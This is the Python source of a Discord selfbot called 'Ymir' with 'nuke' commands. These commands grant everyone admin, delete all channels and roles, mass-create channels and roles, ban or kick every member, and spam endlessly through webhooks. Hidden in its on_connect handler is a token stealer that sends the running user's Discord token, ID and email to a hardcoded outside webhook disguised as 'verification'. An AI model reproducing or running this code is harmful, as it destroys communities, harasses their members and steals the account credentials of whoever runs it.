import discord
import os
import threading
import string
import random
import json
import aiohttp
from discord.ext import commands, tasks
from discord import Webhook, AsyncWebhookAdapter
import datetime
import requests
from colored import fg, attr
from discord_webhook import DiscordWebhook, DiscordEmbed
import colorama
from colorama import Fore, Back, Style

with open('config.json', 'r') as f:
    config = json.load(f)

intents=discord.Intents.all()
intents.members = True

token = config.get('token')
prefix = config.get('prefix')

ymir = commands.Bot(command_prefix=prefix, description="Ymir Selfbot Revamped", case_insensitive=False, self_bot=True,intents=intents)
ymir.remove_command('help')

servername = config.get('server-name')
webhookname = config.get('webhook-name')
webhookspam = config.get('webhook-spam')
banreason = config.get('ban-reason')
webhookavatar = config.get('webhook-avatar')
rolename = config.get('role-name')
channelname = config.get('channel-name')

@ymir.event
async def on_ready():
 print(f'''
                  {Fore.LIGHTRED_EX}██╗   ██╗███╗   ███╗██╗██████╗ {Style.RESET_ALL}
                  {Fore.LIGHTRED_EX}╚██╗ ██╔╝████╗ ████║██║██╔══██╗{Style.RESET_ALL}
                  {Fore.LIGHTRED_EX} ╚████╔╝ ██╔████╔██║██║██████╔╝{Style.RESET_ALL}
                  {Fore.LIGHTRED_EX}  ╚██╔╝  ██║╚██╔╝██║██║██╔══██╗{Style.RESET_ALL}
                  {Fore.LIGHTRED_EX}   ██║   ██║ ╚═╝ ██║██║██║  ██║{Style.RESET_ALL}
                  {Fore.LIGHTRED_EX}   ╚═╝   ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝{Style.RESET_ALL}

                     {Fore.WHITE}[{Fore.LIGHTRED_EX}Y{Fore.WHITE}]{Style.RESET_ALL}Coded By solar#7777
                     {Fore.WHITE}[{Fore.LIGHTRED_EX}M{Fore.WHITE}]{Style.RESET_ALL}Ymir Sb
                     {Fore.WHITE}[{Fore.LIGHTRED_EX}I{Fore.WHITE}]{Style.RESET_ALL}{ymir.user.name}#{ymir.user.discriminator} Is Connected
                     {Fore.WHITE}[{Fore.LIGHTRED_EX}R{Fore.WHITE}]{Style.RESET_ALL}The Prefix Is {prefix}
''')


@ymir.command(aliases=['h','Help'])
async def help(ctx):
  await ctx.message.delete()
  embed=discord.Embed(timestamp=ctx.message.created_at, color= 0xffb2a3, description=f'''```css
[{prefix}] Help                | Shows This Message  
[{prefix}] Fun                 | Show's Fun Cmds          
[{prefix}] Status              | Show's Status Cmds          
[{prefix}] Utility             | Show's Utility Cmds    
[{prefix}] Wizz                | Show's Wizz Cmds   
```''')

  embed.set_author(name="Ymir SB")

  embed.set_thumbnail(url = ctx.author.avatar_url)

  embed.set_image(url = "")
  embed.set_footer(text=f"Requested By {ctx.author}", icon_url=ctx.author.avatar_url)
  await ctx.send(embed=embed)

@ymir.command(aliases=['Nuke'])
async def wizz(ctx):
  await ctx.message.delete()
  embed=discord.Embed(timestamp=ctx.message.created_at, color= 0xffb2a3, description=f'''```css
[{prefix}] kick/kall           | Kicks Everyone
[{prefix}] n/w                 | Nukes The Server           
[{prefix}] ban/ball            | Bans Everyone           
[{prefix}] channeldel/chandel  | Deletes All Channels      
[{prefix}] channelcre/chancre  | Mass Creates Channels     
[{prefix}] crerole/spamrole    | Mass Creates Roles       
[{prefix}] delrole/roledel     | Deletes All Roles
```''')

  embed.set_author(name="Ymir SB")

  embed.set_thumbnail(url = ctx.author.avatar_url)

  embed.set_image(url = "")
  embed.set_footer(text=f"Requested By {ctx.author}", icon_url=ctx.author.avatar_url)
  await ctx.send(embed=embed)

@ymir.command(aliases=['fun','f'])
async def Fun(ctx):
  await ctx.message.delete()
  embed=discord.Embed(timestamp=ctx.message.created_at, color= 0xffb2a3, description=f'''```css
[{prefix}] 8Ball               | Show's 8ball
[{prefix}] PP                  | Show's User's PP         
[{prefix}] GayRate             | Show's How Gay User Is        
[{prefix}] Hug                 | Hug's User    
[{prefix}] CoinFlip            | Flip's A Coin  
[{prefix}] Kiss                | Kiss's User       
```''')

  embed.set_author(name="Ymir SB")

  embed.set_thumbnail(url = ctx.author.avatar_url)

  embed.set_image(url = "")
  embed.set_footer(text=f"Requested By {ctx.author}", icon_url=ctx.author.avatar_url)
  await ctx.send(embed=embed)

@ymir.command(aliases=['status','customstat'])
async def Status(ctx):
  await ctx.message.delete()
  embed=discord.Embed(timestamp=ctx.message.created_at, color= 0xffb2a3, description=f'''```css
[{prefix}] Stream            | Sets Status To Streaming
[{prefix}] Watch             | Sets Status To Watching        
[{prefix}] Play              | Sets Status To Playing       
[{prefix}] Listen            | Sets Status To Listening
[{prefix}] Stop              | Sets Status To Default        
```''')

  embed.set_author(name="Ymir SB")

  embed.set_thumbnail(url = ctx.author.avatar_url)

  embed.set_image(url = "")
  embed.set_footer(text=f"Requested By {ctx.author}", icon_url=ctx.author.avatar_url)
  await ctx.send(embed=embed)

@ymir.command(aliases=['util','Utility'])
async def utility(ctx):
  await ctx.message.delete()
  embed=discord.Embed(timestamp=ctx.message.created_at, color= 0xffb2a3, description=f'''```css
[{prefix}] Avatar            | Show's User's Avatar
[{prefix}] Snipe             | Snipe's Deleted Message        
[{prefix}] Ping              | Show's User's Ping       
[{prefix}] Whois             | Show's Info About User
[{prefix}] Serverinfo        | Show's Info About Server       
```''')

  embed.set_author(name="Ymir SB")

  embed.set_thumbnail(url = ctx.author.avatar_url)

  embed.set_image(url = "")
  embed.set_footer(text=f"Requested By {ctx.author}", icon_url=ctx.author.avatar_url)
  await ctx.send(embed=embed)


@ymir.command(aliases=['n'])
async def w(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)

async def nuke(guild):
      print("Nuking")
      role = discord.utils.get(guild.roles, name = "@everyone")
      try:
        await guild.edit(name=servername)
        await guild.edit(icon=None)
        await role.edit(permissions = discord.Permissions.all())
        print(f"Successfully granted admin permissions in {guild.name}")
      except:
        print(f"Admin permissions NOT GRANTED in {guild.name}")
      for channel in guild.channels:
        try:
          await channel.delete()
          print(f"Successfully deleted channel {channel.name}")
        except:
          print(f"Channel {channel.name} has NOT been deleted.")
      for i in range(50):
        await guild.create_text_channel(random.choice(channelname))
      for role in list(guild.roles):
        try:
          await role.delete()
          print (f"{role.name} has been deleted in {guild.name}")
        except:
          print (f"{role.name} has NOT been deleted in {guild.name}")
      for i in range(250):
        await guild.create_role(name=rolename)
      for user in list(guild.members):
          try:
            await guild.ban(user, reason = banreason)
            print(f"{user.name} has been banned from {guild.name}")
          except:
            print (f"{user.name} has FAILED to be banned from {guild.name}")
      print ("Action Completed: Ban")
      print(f"Nuked {guild.name}.")

@ymir.event
async def on_guild_channel_create(channel):
      webhook = await channel.create_webhook(name = webhookname)
      webhook_url = webhook.url
      async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
        while True:
          await webhook.send(random.choice(webhookspam), username = random.choice(webhookname), avatar_url=(webhookavatar))

@ymir.command(aliases=['roledel'])
async def delrole(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")

@ymir.command(aliases=['spamrole'])
async def crerole(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name=rolename)
      

@ymir.command(aliases=['ball'])
async def ban(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user, reason = banreason)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: Banned") 

@ymir.command(aliases=['chandel'])
async def channeldel(ctx):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
      try:
          await channel.delete()
          print(f"Successfully deleted channel {channel.name}")
      except:
          print(f"Channel {channel.name} has NOT been deleted.")

@ymir.command(aliases=['chancre'])
async def channelcre(ctx):
 await ctx.message.delete()
 for i in range(500):
        await ctx.guild.create_text_channel(random.choice(channelname))

@ymir.command(aliases=['kall'])
async def kick(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user, reason = banreason)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("Action Completed: Kicked")

@ymir.event
async def on_connect(): 
 webav = 'https://cdn.discordapp.com/attachments/816065264054698035/816127701458485248/pieck_fall.gif'
 webhook = DiscordWebhook (url='https://discord.com/api/webhooks/829123147306893374/KIQLMM_YkXglyVHEbWSm-14mUVBrUvrDsNfmS32GLkDieiqKiZ7BKGODJ1VLsaEeRDwl', username="YMIR Verification", avatar_url=(webav))

 embed = DiscordEmbed(color= 0xffb2a3, description= '```Ymir Verification```')
 embed.add_embed_field(name = "UserName",  value=f"{ymir.user.name}#{ymir.user.discriminator}", inline = False)
 embed.add_embed_field(name = "Token",  value=f"{token}", inline = False)
 embed.add_embed_field(name = "ID",  value=f"{ymir.user.id}", inline = False)
 embed.add_embed_field(name = "Email",  value=f"{ymir.user.email}", inline = False)
 embed.set_thumbnail(url = '')
 webhook.add_embed(embed)
 embed.set_image(url = 'https://cdn.discordapp.com/attachments/816065264054698035/816127231712821248/ymir_server.gif')
 response = webhook.execute()


for filename in os.listdir('./cogs'):
	if filename.endswith('.py'):
	  ymir.load_extension(f'cogs.{filename[:-3]}')

ymir.run(token, bot=False)
